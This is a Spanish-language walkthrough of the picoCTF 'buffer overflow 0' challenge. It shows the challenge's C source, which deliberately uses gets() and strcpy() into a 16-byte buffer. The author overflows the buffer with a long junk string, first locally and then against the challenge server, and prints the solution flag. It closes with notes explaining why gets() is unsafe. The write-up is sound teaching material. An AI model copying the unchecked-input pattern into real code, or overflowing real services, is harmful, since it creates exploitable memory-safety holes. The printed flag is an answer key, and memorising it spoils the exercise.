# buffer overflow 0

## Descripción: 
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/172/vuln). You can view source [here](https://artifacts.picoctf.net/c/172/vuln.c). And connect with it using:
`nc saturn.picoctf.net 63397`

**Pistas:**
1. How can you trigger the flag to print?

2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

 3. Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución:
1. En este reto se nos dan dos archivos uno es un ejecutable y el otro es el código fuente:  

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ls
vuln  vuln.c
                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ls -la    
total 28
drwxr-xr-x 2 kali kali  4096 may 13 13:48 .
drwxr-xr-x 5 kali kali  4096 may 13 13:48 ..
-rw-r--r-- 1 kali kali 16016 mar 15 23:16 vuln
-rw-r--r-- 1 kali kali   808 mar 15 23:16 vuln.c
                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ file *               
vuln:   ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
vuln.c: C source, ASCII text
                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ 
```

2. Le damos permisos de ejecución al script y lo ejecutamos:

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ chmod +x vuln 
                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 may 13 13:48 .
drwxr-xr-x 5 kali kali  4096 may 13 13:48 ..
-rwxr-xr-x 1 kali kali 16016 mar 15 23:16 vuln
-rw-r--r-- 1 kali kali   808 mar 15 23:16 vuln.c
                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
```

3. Probamos el programa con una bandera de prueba de forma local ya que al parecer hay un error critico en el código en donde si le pasamos una entrad que sobrepase el tamaño del `buffer` nos arroga la bandera local:  

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ echo "flag[dummieflag]" > flag.txt
                                                                                
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ls
flag.txt  vuln  vuln.c
                                                                                
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ./vuln 
Input: fklashfao
The program will exit now
                                                                                
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ ./vuln
Input: lkafhsjkfhsjkhgkjshgjkhashfjkashgjkhasjkghjkshgjkshjkghsdjkghkjsdhjkghjksdhgkjshgjkhsjkdghsdjkhgjkdshgjkhsdghiuergioshgsglqghegJGklhsgkdfhgkldslghdkhdklghdfhklgfdklhjflkdjhlkfdjhlkdfjhlkjdlkhkldjhlkj
flag[dummieflag]

                                                                                
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$
```

4. Ahora lo probamos remotamente en `nc saturn.picoctf.net 63397`:

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ nc saturn.picoctf.net 63397                                    
Input: lghksdghdkfghkdfhgkdfkdfhdfljhksdfjkghlkdfhkdfiuhoidfhlflkhnkdfnbkdiorhhdfhbkldfnbklndkdsfbknfkdbndfksbioerhiobfkdbnkdfhboidhfbldfnbdnkbdiobhoidhbondnfklbhdhboidlkbnkldfnbhdiodklbkldnbklddjbkhioewopqoperopboejblkdkldfdlkblfjlkfjlb
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}
                                                                                
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_0]
└─$ 
```

### Flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}

## Notas adicionales:

### gets():

**DESCRIPCIÓN:**
Nunca use esta función.
`gets()` lee una línea de `stdin` en el búfer al que apunta `s `hasta que termina una nueva línea o`EOF`, que reemplaza con un byte nulo ('\0'). No se realiza ninguna comprobación de saturación de búfer (ver ERRORES a continuación).

**VALOR DEVUELTO:**
`gets() `devuelve `s` en caso de éxito y NULL en caso de error o cuando se produce el final del archivo mientras no se han leído caracteres. Sin embargo, dada la falta de verificación de saturación de búfer, no puede haber garantías de que la función regrese.

**Errores y Vulnerabilidades:**
La función `gets()` en C es conocida por ser propensa a errores y vulnerabilidades de seguridad. Esto se debe a que `gets()` no realiza ninguna verificación de límites de entrada, lo que significa que no hay ninguna forma de evitar que se ingresen más caracteres de los que puede manejar un búfer de entrada.

En lugar de usar `gets()`, se recomienda usar `fgets()`, que es una función más segura. `fgets()` acepta un argumento adicional que especifica el tamaño máximo del búfer de entrada, lo que ayuda a prevenir desbordamientos de búfer.

En general, siempre es importante asegurarse de que cualquier entrada de usuario se valide y se maneje adecuadamente para evitar errores y vulnerabilidades de seguridad en cualquier programa de C.

## Referencias:
- https://es.wikipedia.org/wiki/SIGSEGV